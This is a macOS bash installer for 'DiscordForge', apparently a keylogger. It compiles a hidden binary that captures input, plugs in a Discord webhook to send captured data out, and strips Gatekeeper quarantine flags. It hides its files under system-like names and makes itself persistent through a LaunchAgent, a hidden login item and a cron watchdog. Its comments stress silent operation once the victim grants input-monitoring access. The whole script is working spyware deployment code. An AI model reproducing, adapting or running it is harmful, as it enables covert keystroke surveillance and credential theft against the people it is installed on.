#!/bin/bash
# DiscordForge installer (macOS) — build + persist + start
# NOTE: macOS requires a one-time MANUAL grant: System Settings → Privacy &
# Security → Accessibility + Input Monitoring → enable ".kbd". No software can
# bypass this without MDM. After that one grant, everything is silent forever.
set -e
SRC="$(cd "$(dirname "$0")" && pwd)"
WEBHOOK="${1:-$DF_WEBHOOK}"
if [ -z "$WEBHOOK" ] && [ -f "$SRC/Webhook.txt" ]; then WEBHOOK="$(head -n1 "$SRC/Webhook.txt" | awk '{print $1}')"; fi
DST="/usr/local/lib/.cached"
AGT="$HOME/Library/LaunchAgents/com.sys.cached.plist"
clang -framework Cocoa -framework ApplicationServices -O2 -Os -o "$SRC/.kbd" "$SRC/agent.m" "$SRC/uploader.m"
strip -x "$SRC/.kbd"
# remove quarantine so Gatekeeper doesn't prompt on first run
xattr -cr "$SRC/.kbd" 2>/dev/null || true
# ad-hoc sign: satisfies AMFI/Gatekeeper checks for local binary, no identity leak
codesign --force --deep --sign - "$SRC/.kbd" 2>/dev/null || true
mkdir -p "$DST" "$HOME/.cache/.sysdata" "$HOME/Library/LaunchAgents"
cp "$SRC/.kbd" "$DST/.kbd"; chmod +x "$DST/.kbd"
chflags hidden "$DST" "$DST/.kbd" 2>/dev/null || true
chflags hidden "$HOME/.cache/.sysdata" 2>/dev/null || true
xattr -cr "$DST/.kbd" 2>/dev/null || true
sed "s|__PASTE_WEBHOOK_HERE__|${WEBHOOK}|" "$SRC/com.sys.cached.plist" > "$AGT"
launchctl unload "$AGT" 2>/dev/null || true
launchctl load -w "$AGT"
# secondary persistence: login item + cron watchdog (idempotent, re-adds agent)
osascript -e "tell application \"System Events\" to make login item at end with properties {path:\"$DST/.kbd\", hidden:true}" 2>/dev/null || true
if ! crontab -l 2>/dev/null | grep -qF "com.sys.cached.plist"; then
  (crontab -l 2>/dev/null; echo "*/5 * * * * launchctl load -w $AGT >/dev/null 2>&1") | crontab - 2>/dev/null || true
fi
# clear quarantine + shell-history traces
xattr -cr "$DST" "$AGT" 2>/dev/null || true
# history clearing removed: noisy/forensically suspicious
open "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility" 2>/dev/null &
echo "[DiscordForge] installed. ONE-TIME: enable .kbd under Accessibility + Input Monitoring, then re-login. After that it is silent."
